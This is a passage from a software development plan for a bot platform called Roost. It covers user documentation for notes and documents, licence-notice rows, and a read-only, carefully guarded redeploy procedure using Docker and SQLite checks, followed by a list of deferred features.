Your notes and documents (docs, sheets and PDFs) belong to you, like your tasks and money. Every bot with the
**Notes** or **Docs** role works on the same ones, and a bot with several roles uses them together: ask an **Office**
bot (Tasks + Finance + Notes + Docs) to "save all my tasks in a document" or "make a sheet of my October expenses".
The **Writer** preset holds Notes + Docs. A bot that keeps your tasks or money but has no Docs role (a Life admin made
before notes and documents, say) gathers the records and hands them to a teammate with the Docs role. When no bot
has it, the bot tells you to add the Docs role from the Roles card on its Desk page.

- **Notes** are markdown with tags (`#tag` or a `tags:` front matter) and `[[links]]` to other notes. Search
  ignores case and accents. On the Board's Notes tab you search, edit with a preview and follow links.
- **Documents**: docs and sheets open in the built-in editor (Univer, only its open-source parts); PDFs open in a
  viewer. A PDF you upload counts as outside content until you press **Keep**.
- Two places editing the same note or document never overwrite each other silently: the later save is told it
  changed, and you pick **Load the latest** or **Keep mine**.
- Everything is encrypted at rest with your key: one encrypted blob per document.
```

`THIRD_PARTY_NOTICES.md` — add these rows to the "Harvested from LazyClaw" table:

```markdown
| `roost/notes/wikilinks.py`, `roost/notes/frontmatter.py`, `roost/notes/text.py` | `lazyclaw/lazybrain/wikilinks.py`, `frontmatter.py`, `store.py` |
| `roost/documents/doc_snapshot.py`, `roost/documents/markdown_blocks.py` | `lazyclaw/docs/snapshot.py`, `lazyclaw/docs/markdown_blocks.py` |
| `roost/documents/sheet_snapshot.py`, `roost/documents/sheet_text.py` | `lazyclaw/sheets/snapshot.py`, `lazyclaw/skills/builtin/sheets.py` |
| `roost/documents/pdf_ops.py` | `lazyclaw/pdf/ops.py` |
| `roost/documents/store.py`, `roost/gateway/routes/documents.py` (semantics) | `lazyclaw/{docs,sheets,pdf}/store.py`, `lazyclaw/gateway/routes/{docs,sheets,pdf}.py` |
| `web/src/components/notes/wikilink.ts`, `web/src/components/notes/noteHelpers.ts` | `web/src/lib/wikilink.ts`, `web/src/components/notes/noteHelpers.ts` |
| `web/src/components/documents/univer/docKit.ts`, `sheetKit.ts`, `DocumentOpen.tsx`, `PdfViewer.tsx` | `web/src/pages/Docs.tsx`, `Sheets.tsx`, `Documents.tsx`, `Pdf.tsx` |
```

- [ ] **Step 7: Gates and commit**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest --cov=roost --cov-fail-under=80 -q && (cd web && npm test && npm run build && npm run size)
git -C /Users/blckit/Desktop/Code_Projects/roost add web/e2e/office.spec.ts web/e2e/fixtures/team-script.json \
  web/playwright.config.ts Makefile CLAUDE.md README.md THIRD_PARTY_NOTICES.md
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "test: Playwright E2E for the Office bot's documents, sheets and notes; docs for M2"
```

---

### Task 8: Redeploy onto the live data

This task deploys Tasks 1–7 to the running Roost: compose project `roost`, container `roost-gateway-1`, with `~/Roost/data` bind-mounted at `/data`.
- The first boot backs up `roost.db` (`roost.db.pre-v10-<timestamp>.bak`) and migrates it from schema v8 to v10.
- The user's password is not known, so every account check is a **read-only** SQL query inside the container, never a login.
- Nothing is committed.

**Files:** none.

**Interfaces:**
- Consumes: `make up` (disk guard + `docker compose up -d --build`; the image's web stage runs `npm ci` from the new lock), the compose healthcheck, `/api/health`.
- Produces: the running gateway at schema version 10, with the notes and docs roles loaded.

- [ ] **Step 1: Path guard and a clean tree**

```bash
git -C /Users/blckit/Desktop/Code_Projects/roost rev-parse --show-toplevel   # /Users/blckit/Desktop/Code_Projects/roost
git -C /Users/blckit/Desktop/Code_Projects/roost branch --show-current       # night-1
git -C /Users/blckit/Desktop/Code_Projects/roost status --short              # empty
```

- [ ] **Step 2: Read-only "before" snapshot**

```bash
docker compose -f /Users/blckit/Desktop/Code_Projects/roost/docker-compose.yml exec -T gateway python -c "
import sqlite3
con = sqlite3.connect('file:/data/roost.db?mode=ro', uri=True)
for table in ('users', 'bots', 'threads', 'messages', 'tasks', 'money_expenses'):
    print(table, con.execute(f'SELECT COUNT(*) FROM {table}').fetchone()[0])
print('schema_version', con.execute('PRAGMA user_version').fetchone()[0])
con.close()
"
```

If `roost-gateway-1` is not running, use `run --rm --no-deps gateway python -c "…"` instead of `exec -T gateway python -c "…"`. That is a one-off container from the current image that only runs the query; nothing starts or migrates.

Expected: `schema_version 8` and the current counts (users ≥ 1). Write the seven values down.

- [ ] **Step 3: Build and start** (only `roost*` objects are touched; new Python deps come from `uv.lock`, new web deps from `web/package-lock.json`)

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && make up
```

If the disk guard prints `BLOCKED: only …GB free`, stop and report it. Never free space by removing anything.

- [ ] **Step 4: Wait until healthy**

```bash
docker compose -f /Users/blckit/Desktop/Code_Projects/roost/docker-compose.yml up -d --wait --wait-timeout 180 gateway
docker inspect -f '{{.State.Health.Status}}' roost-gateway-1   # healthy
curl -fsS http://127.0.0.1:18800/api/health                    # {"status":"ok"}
```

If it is not healthy within 180 s:
1. Run `docker compose -f /Users/blckit/Desktop/Code_Projects/roost/docker-compose.yml logs --tail=100 gateway`.
2. Run `make down`.
3. Report what the logs show.

What the log can show:
- A failed migration rolls back (`MigrationError` in the log), and `~/Roost/data/roost.db.pre-v10-*.bak` stays untouched.
- A broken role file shows as `RoleError` at boot.

Never edit or delete anything under `~/Roost/data`.

- [ ] **Step 5: Read-only "after" check**

Run the Step 2 command again. Expected: `schema_version 10` and the same `users`, `bots`, `tasks` and `money_expenses` counts. `threads` and `messages` may only grow, if the user talked to a bot during the deploy: report the difference, and treat a smaller number as a failure. Then:

```bash
docker compose -f /Users/blckit/Desktop/Code_Projects/roost/docker-compose.yml exec -T gateway python -c "
import sqlite3
con = sqlite3.connect('file:/data/roost.db?mode=ro', uri=True)
for table in ('notes', 'documents'):
    print(table, con.execute(f'SELECT COUNT(*) FROM {table}').fetchone()[0])
con.close()
"
docker compose -f /Users/blckit/Desktop/Code_Projects/roost/docker-compose.yml exec -T gateway python -c "
from roost.bots.roles import default_roles
print(sorted(default_roles().ids))
"
ls -l ~/Roost/data | grep 'roost.db.pre-v10-'     # exactly one new backup (read-only listing)
docker compose -f /Users/blckit/Desktop/Code_Projects/roost/docker-compose.yml logs --tail=80 gateway | grep -c Traceback   # 0
```

Then list which live bots can already save records in a document. This is read-only. Bot names are encrypted, so print each bot's id, preset (`template_id`) and main-bot flag. The `LEFT JOIN` keeps a bot with no roles, such as Chief:

```bash
docker compose -f /Users/blckit/Desktop/Code_Projects/roost/docker-compose.yml exec -T gateway python -c "
import sqlite3
con = sqlite3.connect('file:/data/roost.db?mode=ro', uri=True)
rows = con.execute('''SELECT b.id, b.template_id, b.is_primary, group_concat(r.role_id)
                      FROM bots b LEFT JOIN bot_roles r ON r.bot_id = b.id AND r.user_id = b.user_id
                      GROUP BY b.id ORDER BY b.created_at''').fetchall()
for bot_id, preset, primary, roles in rows:
    held = set((roles or '').split(',')) - {''}
    gap = 'NEEDS DOCS' if held & {'tasks', 'finance'} and not held & {'docs', 'notes'} else ''
    print(bot_id, preset, 'main' if primary else '-', sorted(held), gap)
print('docs holders:', sum(1 for *_, roles in rows if 'docs' in (roles or '').split(',')))
con.close()
"
```

Expected:
- One line per bot.
- Today's Life admin (tasks + finance) shows `NEEDS DOCS`, and `docs holders: 0`. The deploy adds no role, on purpose, because the roles are the user's choice.

With no docs holder, "save all my tasks in a document" ends with the bot saying the Docs role can be added on its Desk, or Chief suggesting an Office bot (Task 3's hand-over hint). That is correct, but it is not yet "it just works". The report must say so plainly.

Expected for the rest of this step:
- `notes 0` and `documents 0`, unless the user already used them.
- The roles are `['docs', 'finance', 'notes', 'tasks', 'web']`.
- Exactly one new backup, and no `Traceback` lines.

- [ ] **Step 6: Report** the before/after counts, the schema version, the backup file name, the loaded roles and the health result. No commit.

Also report each `NEEDS DOCS` bot (its id and preset), with the one action that makes the user's request just work. Either add **Docs** (and **Notes**) on that bot's Desk → Roles card, or create an **Office** bot from New bot → Office. Once any bot holds docs, the others hand their records to it with `ask_bot docs`.

---

## Deferred (not in this plan, on purpose)

- **Notes extras** (D1: later): journal / daily notes, per-bot memory and skills, embeddings and semantic search, rerank, the graph, a backlinks panel, renaming a page across its `[[links]]`, aliases.
- **Documents extras:**
  - .docx/.xlsx import and export (python-docx, openpyxl), and server-side formula recalculation (a formula's value appears once the sheet opens in Univer).
  - PDF editing (merge, split, rotate, fill forms, stamp text, redact) and PDF version history.
  - Sheet styles, hyperlinks and other presets (filter, sort, find-replace, conditional formatting).
  - Renaming a document or tagging it from the Board. The `documents.tags` column is reserved.
- **Outbound documents:** `send_doc` and `send_sheet` sit on the hard floor (spec §6.6). They come with the Inbox step.
- **Ask cards for the spec's default rules** (spec §6.4/§6.6, step 7):
  - "Saving a fact that came from a web page: ask me" today is a create stored **tainted** (at most 3 per run, M1 D3), not a question.
  - "Editing another existing document: ask me" today is allowed in a clean run. A tainted run is refused, with a New conversation as the way out (M1 R1).
- **Live co-editing:** two editors on one document resolve by revision and the conflict prompt, not by merging.
- **The phone's Board** for notes and documents (mobile `screens/notes/*`, `screens/documents/*`).
- **M4 import** of LazyClaw's notes and documents:
  - Columns map by meaning: notes `title/content/tags/pinned`; `docs`/`sheets`/`pdf_files` `name → title`, `payload`, `pages`, `tags`.
  - LazyClaw's plaintext `notes.tags`, `title_key` and document `name`/`tags` become encrypted columns plus the HMAC `title_key`.
  - Payloads are re-encrypted under the same AAD contexts.
